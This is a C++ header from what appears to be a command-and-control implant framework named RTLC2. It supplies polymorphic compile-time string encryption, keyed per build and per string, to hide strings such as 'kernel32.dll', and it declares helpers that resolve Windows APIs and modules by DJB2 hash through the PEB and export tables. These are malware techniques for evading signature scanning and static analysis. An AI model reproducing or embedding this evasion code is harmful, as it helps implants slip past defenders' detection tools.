#ifndef RTLC2_OBFUSCATION_H
#define RTLC2_OBFUSCATION_H

#include <cstdint>
#include <cstring>
#include <mutex>

// Pull in RTLC2_OBFSTR_SEED from build configuration if available.
// This seed changes per-build, making encrypted strings unique across
// different compilations even for identical source strings.
#if __has_include("config.h")
#include "config.h"
#endif

#ifndef RTLC2_OBFSTR_SEED
#define RTLC2_OBFSTR_SEED 0xDEADBEEF
#endif

namespace rtlc2 {
namespace obfuscation {

// Polymorphic compile-time string encryption.
//
// Each string derives its own XOR key from a DJB2 hash of its content,
// mixed with a per-build seed (RTLC2_OBFSTR_SEED). This means:
//   - Different strings use different keys (polymorphic)
//   - The same string in different builds uses different keys (per-build)
//   - Position-dependent XOR (key + index) prevents pattern analysis
//
// Usage: OBFSTR("kernel32.dll") -> decrypts at runtime

template<size_t N>
struct ObfuscatedString {
    char data[N];
    uint8_t key;

    // Compile-time encryption constructor.
    // Derives a unique key from the string content and build seed,
    // then XORs each character with (key + position) for diffusion.
    constexpr ObfuscatedString(const char (&str)[N]) : data{}, key(0) {
        // DJB2 hash of the string content (including null terminator)
        uint32_t hash = 5381;
        for (size_t i = 0; i < N; i++) {
            hash = ((hash << 5) + hash) + (uint8_t)str[i];
        }

        // Mix in build seed for per-build uniqueness
        hash ^= (uint32_t)RTLC2_OBFSTR_SEED;

        // Fold 32-bit hash down to a single byte key
        key = (uint8_t)(hash ^ (hash >> 8) ^ (hash >> 16) ^ (hash >> 24));

        // Avoid null key (would result in no encryption for some chars)
        if (key == 0) key = 0x42;

        // Encrypt: XOR each byte with (key + position index)
        for (size_t i = 0; i < N; i++) {
            data[i] = str[i] ^ (key + (uint8_t)i);
        }
    }

    // Runtime decryption into a caller-provided buffer.
    // Buffer must be at least N bytes. Returns pointer to buffer.
    char* decrypt(char* buf) const {
        for (size_t i = 0; i < N; i++) {
            buf[i] = data[i] ^ (key + (uint8_t)i);
        }
        return buf;
    }

    // Decrypt and zero the encrypted data afterward (paranoid mode).
    // Useful when the decrypted string is only needed briefly.
    char* decryptAndWipe(char* buf) {
        decrypt(buf);
        volatile char* p = data;
        for (size_t i = 0; i < N; i++) {
            p[i] = 0;
        }
        return buf;
    }
};

// Helper macro
#define OBFSTR(str) ([]() -> const char* { \
    constexpr auto obf = rtlc2::obfuscation::ObfuscatedString(str); \
    static char buf[sizeof(str)]; \
    static std::once_flag flag; \
    std::call_once(flag, [&]() { obf.decrypt(buf); }); \
    return buf; \
}())

// DJB2 hash for API name resolution
constexpr uint32_t DJB2Hash(const char* str) {
    uint32_t hash = 5381;
    while (*str) {
        hash = ((hash << 5) + hash) + (uint8_t)*str++;
    }
    return hash;
}

// Runtime DJB2 hash
inline uint32_t DJB2HashRuntime(const char* str) {
    uint32_t hash = 5381;
    while (*str) {
        hash = ((hash << 5) + hash) + (uint8_t)*str++;
    }
    return hash;
}

// API hashing macros for compile-time hash generation
#define API_HASH(name) rtlc2::obfuscation::DJB2Hash(name)

#ifdef RTLC2_WINDOWS

// Resolve API by hash from a module's export table
void* ResolveAPIByHash(void* moduleBase, uint32_t apiHash);

// Resolve module by hash from PEB
void* ResolveModuleByHash(uint32_t moduleHash);

#endif

} // namespace obfuscation
} // namespace rtlc2

#endif // RTLC2_OBFUSCATION_H
